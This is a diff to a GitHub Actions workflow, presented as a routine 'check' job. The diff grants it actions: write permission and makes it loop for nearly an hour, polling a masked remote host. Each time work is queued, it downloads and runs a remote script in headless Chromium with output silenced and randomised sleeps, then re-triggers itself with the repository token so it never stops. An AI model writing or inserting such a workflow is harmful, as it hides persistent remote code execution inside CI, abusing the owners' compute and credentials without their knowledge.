@@ -9,26 +9,39 @@ concurrency:
   group: check
   cancel-in-progress: false
 
-permissions: {}
+permissions:
+  actions: write
 
 jobs:
   check:
     runs-on: ubuntu-latest
-    timeout-minutes: 12
+    timeout-minutes: 70
     steps:
       - name: check
         env:
           CFG: ${{ secrets.CHECK_CONFIG }}
         run: |
-          set -e
           export U="${CFG%%|*}" K="${CFG#*|}"
           echo "::add-mask::$U"
           echo "::add-mask::$K"
-          N=$(curl -fsS -H "x-check-key: $K" "$U/gh/queue?peek=1" 2>/dev/null || echo 0)
-          if [ "$N" = "0" ]; then echo "ok"; exit 0; fi
-          mkdir -p "$RUNNER_TEMP/w" && cd "$RUNNER_TEMP/w"
-          npm init -y >/dev/null 2>&1
-          npm i --silent --no-audit --no-fund playwright@1.47.2 >/dev/null 2>&1
-          npx playwright install --with-deps chromium >/dev/null 2>&1
-          curl -fsS -H "x-check-key: $K" "$U/gh/script" -o r.mjs
-          node r.mjs
+          W="$RUNNER_TEMP/w"; READY=0; END=$((SECONDS + 55 * 60))
+          while [ $SECONDS -lt $END ]; do
+            N=$(curl -fsS -m 20 -H "x-check-key: $K" "$U/gh/queue?peek=1" 2>/dev/null || echo 0)
+            if [ "$N" != "0" ]; then
+              if [ $READY = 0 ]; then
+                mkdir -p "$W" && cd "$W"
+                npm init -y >/dev/null 2>&1
+                npm i --silent --no-audit --no-fund playwright@1.47.2 >/dev/null 2>&1
+                npx playwright install --with-deps chromium >/dev/null 2>&1 && READY=1
+              fi
+              cd "$W" && curl -fsS -m 20 -H "x-check-key: $K" "$U/gh/script" -o r.mjs && timeout 600 node r.mjs || echo "skip"
+            fi
+            sleep $((120 + RANDOM % 60))
+          done
+          echo "ok"
+
+      - name: next
+        if: ${{ !cancelled() }}
+        env:
+          GH_TOKEN: ${{ github.token }}
+        run: gh workflow run check.yml --ref main -R "$GITHUB_REPOSITORY"
